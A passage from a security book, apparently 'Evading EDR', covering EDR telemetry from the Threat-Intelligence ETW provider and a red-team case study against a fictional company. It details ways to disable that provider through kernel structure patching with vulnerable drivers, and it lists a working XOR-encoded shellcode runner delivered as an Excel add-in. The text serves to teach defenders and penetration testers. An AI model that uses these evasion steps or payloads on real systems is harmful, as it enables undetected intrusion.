NULL, NULL, NULL, NULL, NULL);
if (!hService) {
CloseServiceHandle(hSCM);
return FALSE;
}
info.dwLaunchProtected =
SERVICE_LAUNCH_PROTECTED_ANTIMALWARE_LIGHT;
 3 if (!ChangeServiceConfig2W(
hService,
SERVICE_CONFIG_LAUNCH_PROTECTED,
&info))
{
CloseServiceHandle(hService);
CloseServiceHandle(hSCM);
return FALSE;
}
if (!StartServiceW(hService, 0, NULL)) {
CloseServiceHandle(hService);
CloseServiceHandle(hSCM);
return FALSE;
}
return TRUE;
}
Listing 12-25: Creating the consumer service
First, we open a handle to the Service Control Manager 1, the operat-
ing system component responsible for overseeing all services on the host. 
Next, we create the base service via a call to kernel32!CreateServiceW() 2. 
This function accepts information, such as the service name, its display 
name, and the path to the service binary, and returns a handle to the 
newly created service when it completes. We then call kernel32!ChangeServic
eConfig2W() to set the new service’s protection level 3.
When this function completes successfully, Windows will start the pro-
tected consumer service, shown running in the Process Explorer window 
in Figure 12-7.
Figure 12-7: EtwTi consumer service running with the required protection level
Now it can begin working with events from the EtwTi provider.
Processing Events
You can write a consumer for the EtwTi provider in virtually the same way 
as you would for a normal ETW consumer, a process discussed in Chapter 8. 
Once you’ve completed the protection and signing steps described in the 
Evading EDR (Early Access) © 2023 by Matt Hand
Microsoft-Windows-Threat-Intelligence   233
previous section, the code for receiving, processing, and extracting data 
from events is the same as for any other provider.
However, because the EtwTi consumer service is protected, you might 
find it difficult to work with events during development, such as by reading 
printf-style output. Thankfully, the provider’s manifest can provide you with 
event formats, IDs, and keywords, which can make working with the events 
much easier.
Evading EtwTi
Because they live in the kernel, EtwTi sensors provide EDRs with a robust 
telemetry source that is hard to tamper with. There are, however, a few ways 
that attackers may either neuter the sensors’ capabilities or at least coexist 
with them.
Coexistence
The simplest evasion approach involves using Neo4j to return all syscalls 
that hit EtwTi sensors, then refraining from calling these functions in your 
operations. This means you’ll have to find alternative ways to perform tasks 
such as memory allocation, which can be daunting.
For example, Cobalt Strike’s Beacon supports three memory allocation 
methods: HeapAlloc, MapViewOfFile, and VirtualAlloc. Those last two methods 
both call a syscall that EtwTi sensors monitor. The first method, on the 
other hand, calls ntdll!RtlAllocateHeap(), which has no outgoing references 
to EtwTi functions, making it the safest bet. The downside is that it doesn’t 
support allocations in remote processes, so you can’t perform process 
injection with it.
As with all telemetry sources in this book, remember that some other 
source might be covering the gaps in the EtwTi sensors. Using HeapAlloc as 
an example, endpoint security agents may track and scan executable heap 
allocations created by user-mode programs. Microsoft may also modify 
APIs to call the existing sensors or add entirely new sensors at any time. 
This requires that teams remap the relationships from syscalls to EtwTi 
sensors on each new build of Windows, which can be time consuming.
Trace-Handle Overwriting
Another option is to simply invalidate the global trace handle in the kernel. 
Upayan Saha’s “Data Only Attack: Neutralizing EtwTi Provider” blog post 
covers this technique in great detail. It requires the operator to have an 
arbitrary read-write primitive in a vulnerable driver, such as those present 
in previous versions of Gigabyte’s atillk64.sys and LG Device Manager’s  
lha.sys, two signed drivers published by the PC hardware and peripheral 
manufacturers for legitimate device-support purposes.
The primary challenge of this technique is locating the TRACE_ENABLE_INFO 
structure, which defines the information used to enable the provider. Inside 
Evading EDR (Early Access) © 2023 by Matt Hand
234   Chapter 12
this structure is a member, IsEnabled, that we must manually change to 0 
to prevent events from reaching the security product. We can use some of 
what we’ve already learned about how events are published to help make 
this process easier.
Recall from the previous sections that all sensors use the global 
EtwThreatIntProvRegHandle REGHANDLE when calling nt!EtwWrite() to emit an 
event. This handle is actually a pointer to an ETW_REG_ENTRY structure, which 
itself contains a pointer to an ETW_GUID_ENTRY structure in its GuidEntry mem-
ber (offset 0x20), as shown in Listing 12-26.
0: kd> dt nt!_ETW_REG_ENTRY poi(nt!EtwThreatIntProvRegHandle)
 --snip--
 +0x020 GuidEntry  
: 0xffff8e8a`901f3c50 _ETW_GUID_ENTRY
 --snip--
Listing 12-26: Getting the address of the ETW_GUID_ENTRY structure
This structure is the kernel’s record of an event provider and contains 
an array of eight TRACE_ENABLE_INFO structures in its EnableInfo member (offset 
0x80). Only the first entry, the contents of which are included in Listing 12-27, 
is used by default.
0: kd> dx -id 0,0,ffff8e8a90062040 -r1 (*((ntkrnlmp!_TRACE_ENABLE_INFO *)0xffff8e8a901f3cd0))
(*((ntkrnlmp!_TRACE_ENABLE_INFO *)0xffff8e8a901f3cd0))
[Type: _TRACE_ENABLE_INFO]
 1 [+0x000] IsEnabled  
: 0x1 [Type: unsigned long]
 [+0x004] Level  
: 0xff [Type: unsigned char]
 [+0x005] Reserved1  
: 0x0 [Type: unsigned char]
 [+0x006] LoggerId  
: 0x4 [Type: unsigned short]
 [+0x008] EnableProperty  
: 0x40 [Type: unsigned long]
 [+0x00c] Reserved2  
: 0x0 [Type: unsigned long]
 [+0x010] MatchAnyKeyword 
: 0xdcfa5555 [Type: unsigned __int64]
 [+0x018] MatchAllKeyword 
: 0x0 [Type: unsigned __int64]
Listing 12-27: Extracting the contents of the first TRACE_ENABLE_INFO structure
This member is an unsigned long (really a Boolean, per Microsoft’s 
documentation) that indicates whether the provider is enabled for the 
trace session 1.
If an attacker can flip this value to 0, they can disable the Microsoft-
Windows-Threat-Intelligence provider, preventing the consumer from 
receiving events. Working back through these nested structures, we can 
find our target using the following steps:
 1. Finding the address of the ETW_REG_ENTRY pointed to by 
EtwThreatIntRegHandle
 2. Finding the address of the ETW_GUID_ENTRY pointed to by the ETW_REG_ENTRY 
structure’s GuidEntry member (offset 0x20)
 3. Adding 0x80 to the address to get the IsEnabled member of the first 
TRACE_ENABLE_INFO structure in the array
Evading EDR (Early Access) © 2023 by Matt Hand
Microsoft-Windows-Threat-Intelligence   235
Finding the address of EtwThreatIntProvRegHandle is the most challenging 
part of this technique, as it requires using the arbitrary read in the vulner-
able driver to search for a pattern of opcodes that work with the pointer to 
the structure.
According to his blog post, Saha used nt!KeInsertQueueApc() as the start-
ing point of the search, as this function is exported by ntoskrnl.exe and refer-
ences the address of the REGHANDLE in an early call to nt!EtwProviderEnabled. 
Per the Windows calling convention, the first parameter passed to a func-
tion is stored in the RCX register. Therefore, this address will be placed 
into the register prior to the call to nt!EtwProviderEnabled using a MOV instruc-
tion. By searching for the opcodes 48 8b 0d corresponding to mov rcx,qword 
ptr [x] from the function entry point until the call to nt!EtwProviderEnabled, 
we can identify the virtual address of the REGHANDLE. Then, using the offsets 
identified earlier, we can set its IsEnabled member to 0.
Another method of locating EtwThreatIntProvRegHandle is to use its offset 
from the base address of the kernel. Due to kernel address space layout 
randomization (KASLR), we can’t know its full virtual address, but its off-
set has proven to be stable across reboots. For example, on one build of 
Windows, this offset is 0xC197D0, as shown in Listing 12-28.
0: kd> vertarget
--snip--
Kernel base = 0xfffff803`02c00000 PsLoadedModuleList = 0xfffff803`0382a230
--snip--
0: kd> x /0 nt!EtwThreatIntProvRegHandle
fffff803`038197d0
0: kd> ? fffff803`038197d0 - 0xfffff803`02c00000
Evaluate expression: 12687312 = 00000000`00c197d0
Listing 12-28: Finding the offset to the REGHANDLE
The last line in this listing subtracts the base address of the kernel 
from the address of the REGHANDLE. We can retrieve this base address 
relatively easily from user mode by running ntdll!NtQuerySystemInformat
ion() with the SystemModuleInformation information class, demonstrated in 
Listing 12-29.
void GetKernelBaseAddress()
{
NtQuerySystemInformation pfnNtQuerySystemInformation = NULL;
HMODULE hKernel = NULL;
HMODULE hNtdll = NULL;
RTL_PROCESS_MODULES ModuleInfo = { 0 };
hNtdll = GetModuleHandle(L"ntdll");
1 pfnNtQuerySystemInformation =
(NtQuerySystemInformation)GetProcAddress(
hNtdll, "NtQuerySystemInformation");
Evading EDR (Early Access) © 2023 by Matt Hand
236   Chapter 12
pfnNtQuerySystemInformation(
2 SystemModuleInformation,
 &ModuleInfo,
 sizeof(ModuleInfo),
 NULL);
wprintf(L"Kernel Base Address: %p\n",
3 (ULONG64)ModuleInfo.Modules[0].ImageBase);
}
Listing 12-29: Getting the base address of the kernel
This function first gets a function pointer to ntdll!NtQuerySystemInformat
ion() 1 and then invokes it, passing in the SystemModuleInformation informa-
tion class 2. Upon completion, this function will populate the RTL_PROCESS 
_MODULES structure (named ModuleInfo), at which point the address of the ker-
nel can be retrieved by referencing the ImageBase attribute of the first entry 
in the array 3.
You’ll still require a driver with a write-what-where primitive to patch 
the value, but using this approach avoids us having to parse memory for 
opcodes. This technique also introduces the problem of tracking offsets to 
EtwThreatIntProvRegHandle across all kernel versions on which they operate, 
however, so it isn’t without its own challenges.
Additionally, those who employ this technique must also consider the 
telemetry it generates. For instance, loading a vulnerable driver is harder 
on Windows 11, as Hypervisor-Protected Code Integrity is enabled by 
default, which can block drivers known to contain vulnerabilities. At the 
detection level, loading a new driver will trigger the nt!EtwTiLogDriverObject
Load() sensor, which may be atypical for the system or environment, causing 
a response.
Conclusion
The Microsoft-Windows-Threat-Intelligence ETW provider is one of the 
most important data sources available to an EDR at the time of this writing. 
It provides unparalleled visibility into processes executing on the system by 
sitting inline of their execution, similar to function-hooking DLLs. Despite 
their likeness, however, this provider and its hooks live in the kernel, where 
they are far less susceptible to evasion through direct attacks. Evading this 
data source is more about learning to work around it than it is about find-
ing the glaring gap or logical flaw in its implementation.
Evading EDR (Early Access) © 2023 by Matt Hand
So far, we’ve covered the design of EDRs, 
the logic of their components, and the 
internal workings of their sensors. Still, we’ve 
missed one critical piece of the puzzle: how to 
apply this information in the real world. In this final 
chapter, we’ll systematically analyze the actions we’d 
like to take against target systems and determine our 
risk of being detected.
We’ll target a fictional company, Binford Tools, inventor of the Binford 
6100 left-handed screwdriver. Binford has asked us to identify an attack 
path from a compromised user workstation to a database holding the pro-
prietary design information for the 6100. We’re to be as stealthy as possible 
so that the company can see what its EDR is able to detect. Let’s get started.
13
C A S E S T U DY: A  DE T EC T ION -
AWA R E AT TACK
Evading EDR (Early Access) © 2023 by Matt Hand
238   Chapter 13
The Rules of Engagement
Binford’s environment only consists of hosts running up-to-date versions 
of the Windows operating system, and all authentication is controlled 
through on-premises Active Directory. Each host has a generic EDR 
deployed and running, and we aren’t allowed to disable, remove, or unin-
stall it at any point.
Our point of contact has agreed to provide us with a target email 
address, which an employee (whom we’ll refer to as the white cell) will moni-
tor, clicking whatever links we send to them. However, they won’t add any 
rule explicitly allowing our payloads past their EDR. This will let us spend 
less time on social engineering and more time assessing technical detective 
and preventive measures.
Additionally, every employee at Binford has local administrator 
rights to their workstation, lowering the strain on Binford’s understaffed 
help desk. Binford has asked that we leverage this fact during the opera-
tion so that they can use the results of the engagement to drive a change 
to their policy.
Initial Access
We begin by selecting our phishing method. We need fast and direct access 
to the target’s workstation, so we opt to deliver a payload. Threat intelli-
gence reporting at the time of the engagement tells us that the manufac-
turing sector is experiencing an uptick in malware dropped using Excel 
Add-In (XLL) files. Attackers have routinely abused XLL files, which allow 
developers to create high-performance Excel worksheet functions, to estab-
lish a foothold through phishing.
To mimic attacks Binford may respond to in the future, we opt to use 
this format as our payload. XLL files are really just DLLs that are required 
to export an xlAutoOpen() function (and, ideally, its complement, xlAuto-
Close()), so we can use a simple shellcode runner to speed up the develop-
ment process.
Writing the Payload
Already, we must make a detection-related design decision. Should the 
shellcode be run locally, in the excel.exe process, where it will be tied to the 
lifetime of that process, or should it be run remotely? If we created our own 
host process and injected into it, or if we targeted an existing process, our 
shellcode could live longer but have a higher risk of detection due to excel.
exe spawning a child process and the artifacts of remote process injection 
being present.
As we can always phish more later, we’ll opt to use the local runner and 
avoid prematurely tripping any detections. Listing 13-1 shows what our XLL 
payload code looks like.
Evading EDR (Early Access) © 2023 by Matt Hand
Case Study: A Detection-Aware Attack   239
#define WIN32_LEAN_AND_MEAN
#include 
BOOL APIENTRY DllMain( HMODULE hModule,
DWORD   ul_reason_for_call,
LPVOID  lpReserved
)
{
switch (ul_reason_for_call)
{
case DLL_PROCESS_ATTACH:
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DETACH:
 break;
}
return TRUE;
}
extern "C"
__declspec(dllexport) short __stdcall xlAutoOpen()
{
 1 const char shellcode[] = --snip--
const size_t lenShellcode = sizeof(shellcode);
char decodedShellcode[lenShellcode];
 2 const char key[] = "specter";
int j = 0;
for (int i = 0; i < lenShellcode; i++)
{
if (j == sizeof(key) - 1)
{
j = 0;
}
3 decodedShellcode[i] = shellcode[i] ^ key[j];
j++;
}
 4 PVOID runIt = VirtualAlloc(0,
lenShellcode,
MEM_COMMIT,
PAGE_READWRITE);
if (runIt == NULL)
{
return 1;
}
 5 memcpy(runIt,
decodedShellcode,
lenShellcode);
Evading EDR (Early Access) © 2023 by Matt Hand
240   Chapter 13
DWORD oldProtect = 0;
 6 VirtualProtect(runIt,
lenShellcode,
PAGE_EXECUTE_READ,
&oldProtect);
 7 CreateThread(NULL,
NULL,
(LPTHREAD_START_ROUTINE)runIt,
NULL,
NULL,
NULL);
Sleep(1337);
return 0;
}
Listing 13-1: The XLL payload source code
This local shellcode runner is similar to many DLL-based payloads. 
The exported xlAutoOpen() function begins with a chunk of shellcode (trun-
cated for brevity) 1 that has been XOR-encrypted using the string specter 
as the key 2. The first action this function takes is decrypting the shellcode 